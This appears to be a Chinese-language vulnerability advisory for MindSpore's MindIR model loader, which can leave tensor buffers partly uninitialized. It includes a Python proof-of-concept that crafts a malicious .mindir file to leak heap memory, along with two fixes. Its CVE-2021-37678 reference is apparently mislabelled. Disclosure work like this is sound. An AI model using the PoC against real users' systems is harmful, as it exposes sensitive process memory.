# MS-2025-003: MindIR Tensor 未初始化内存信息泄露

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [mindspore-ai/mindspore](https://github.com/mindspore-ai/mindspore) |
| **版本** | 2.4.0rc1 (main branch 截至 2026-05-19) |
| **严重性** | Medium |
| **CVSS 3.1** | 5.5 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N) |
| **CWE** | CWE-908 (Use of Uninitialized Resource) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 本地/需要用户加载恶意模型文件 |
| **影响组件** | `mindspore/core/load_mindir/load_model.cc` |

## 漏洞概述

当 MindIR 模型文件中 `raw_data` 的实际大小小于根据 tensor shape 和 dtype 计算的期望大小（`tensor->data().nbytes()`）时，`memcpy_s` 只会复制 `raw_data.size()` 字节到 tensor 缓冲区，剩余空间保留为**未初始化的堆内存**。

攻击者可以构造一个恶意模型：声明大 shape 但只提供少量 raw_data。当受害者加载模型并对 tensor 做推理/导出操作时，未初始化内存中的敏感数据（来自同一进程之前的堆分配）可能随推理结果一起泄露。

## 漏洞代码

**文件**: `mindspore/core/load_mindir/load_model.cc` (第519-543行)

```cpp
tensor::TensorPtr MSANFModelParser::GenerateTensorPtrFromTensorProto(
    const mind_ir::TensorProto &attr_tensor) {
  ShapeVector shape;
  for (int i = 0; i < attr_tensor.dims_size(); ++i) {
    shape.push_back(attr_tensor.dims(i));
  }
  
  // 根据 shape 分配 tensor 缓冲区（未清零！）
  tensor = std::make_shared<tensor::Tensor>(kDefaultValueSwitchMap[attr_tensor_type], shape);

  const std::string &tensor_buf = attr_tensor.raw_data();
  if (attr_tensor.has_raw_data() && tensor->data().nbytes() != 0) {
    auto *tensor_data_buf = reinterpret_cast<uint8_t *>(tensor->data_c());
    // ⚠️ 如果 tensor_buf.size() < tensor->data().nbytes()，
    // memcpy_s 成功（只检查 count <= destSize），但缓冲区部分未初始化
    errno_t ret = memcpy_s(tensor_data_buf, tensor->data().nbytes(), 
                           tensor_buf.data(), tensor_buf.size());
    // tensor_data_buf[tensor_buf.size() ... tensor->data().nbytes()-1] 是未初始化内存！
  }
```

**问题分析**：
- `tensor->data().nbytes()` = `shape[0] * shape[1] * ... * sizeof(dtype)` （由 protobuf 中的 dims 决定）
- `tensor_buf.size()` = protobuf 中 `raw_data` 的实际字节数
- 如果 dims 声明为 `[1000000]` (float32 → 4MB)，但 raw_data 只有 4 bytes
- `memcpy_s(buf, 4MB, data, 4)` → 成功，但 buf 中 4MB-4 = 几乎全部是未初始化堆数据

## PoC 构造思路

```python
"""
构造 MindIR 模型：大 tensor shape + 小 raw_data
导致 tensor 中包含未初始化堆内存
"""
from mindspore.train.mind_ir_pb2 import ModelProto, TensorProto
import struct

model = ModelProto()
model.ir_version = 6
model.producer_name = "MindSpore"
graph = model.graph
graph.name = "leak_graph"

# 声明一个大 tensor (1024 个 float32 = 4096 bytes)
# 但只提供 4 bytes 的 raw_data
param = graph.parameter.add()
param.name = "Default/leak_param:leak_param"
param.data_type = 1  # FLOAT32
param.dims.extend([1024])  # shape = [1024]，期望 4096 bytes

# 只给 4 bytes 的数据
param.raw_data = struct.pack('f', 1.0)  # 只有 4 bytes！

with open("./leak_model.mindir", "wb") as f:
    f.write(model.SerializeToString())

print("PoC 模型已创建")
print("tensor shape 期望 4096 bytes，但 raw_data 只有 4 bytes")
print("剩余 4092 bytes 是未初始化的堆内存")
print("")
print("加载后通过 tensor.asnumpy() 可以看到泄露的堆数据:")
print("  import mindspore")
print("  graph = mindspore.load('leak_model.mindir')")
print("  # 提取 tensor 数据...")
```

## 修复建议

### 方案1：校验 raw_data 大小必须匹配

```cpp
const std::string &tensor_buf = attr_tensor.raw_data();
if (attr_tensor.has_raw_data() && tensor->data().nbytes() != 0) {
  // 修复：校验大小一致性
  if (tensor_buf.size() != static_cast<size_t>(tensor->data().nbytes())) {
    MS_LOG(ERROR) << "Tensor raw_data size (" << tensor_buf.size() 
                  << ") does not match expected size (" << tensor->data().nbytes() << ").";
    return nullptr;
  }
  // ... memcpy_s ...
}
```

### 方案2：零填充剩余空间

```cpp
// 先清零整个 tensor 缓冲区
auto *tensor_data_buf = reinterpret_cast<uint8_t *>(tensor->data_c());
(void)memset_s(tensor_data_buf, tensor->data().nbytes(), 0, tensor->data().nbytes());
// 然后复制 raw_data
errno_t ret = memcpy_s(tensor_data_buf, tensor->data().nbytes(), 
                       tensor_buf.data(), tensor_buf.size());
```

## 参考

- [CWE-908: Use of Uninitialized Resource](https://cwe.mitre.org/data/definitions/908.html)
- [CVE-2021-37678: TensorFlow uninitialized memory in TFLite](https://nvd.nist.gov/vuln/detail/CVE-2021-37678)
